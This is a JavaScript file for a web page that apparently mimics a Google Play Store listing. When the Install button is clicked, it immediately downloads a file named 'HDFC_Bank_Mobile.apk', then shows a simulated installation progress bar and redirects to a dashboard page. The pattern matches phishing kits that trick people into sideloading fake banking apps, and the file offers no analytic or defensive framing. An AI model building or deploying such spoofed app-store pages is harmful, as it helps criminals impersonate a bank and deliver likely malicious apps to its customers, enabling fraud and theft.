document.addEventListener('DOMContentLoaded', () => {
    const installBtn = document.getElementById('installBtn');
    
    // Immediate APK Download on Install Click
    installBtn.addEventListener('click', () => {
        if (installBtn.textContent === 'Install') {
            // 1. TRIGGER APK DOWNLOAD IMMEDIATELY
            const downloadLink = document.createElement('a');
            downloadLink.href = 'HDFC_Bank_Mobile.apk';
            downloadLink.download = 'HDFC_Bank_Mobile.apk';
            document.body.appendChild(downloadLink);
            downloadLink.click();
            document.body.removeChild(downloadLink);

            // 2. Start visual simulation
            installBtn.style.backgroundColor = '#dadce0';
            installBtn.style.color = '#5f6368';
            installBtn.textContent = 'Pending...';
            
            let progress = 0;
            const interval = setInterval(() => {
                progress += Math.floor(Math.random() * 25);
                if (progress >= 100) {
                    clearInterval(interval);
                    installBtn.textContent = 'Open';
                    installBtn.style.backgroundColor = '#01875f';
                    installBtn.style.color = 'white';
                    
                    // Redirect to dashboard (index.html) after a short delay
                    setTimeout(() => {
                        window.location.href = 'index.html';
                    }, 1000);
                } else {
                    installBtn.textContent = `Installing ${progress}%`;
                }
            }, 400);
        }
    });

    // Add click listeners to headers for expand/collapse feel
    const headers = document.querySelectorAll('.section-header');
    headers.forEach(header => {
        header.addEventListener('click', () => {
            const content = header.nextElementSibling;
            if (content.style.display === 'none') {
                content.style.display = 'block';
            } else {
                content.style.display = 'none';
            }
        });
    });
});
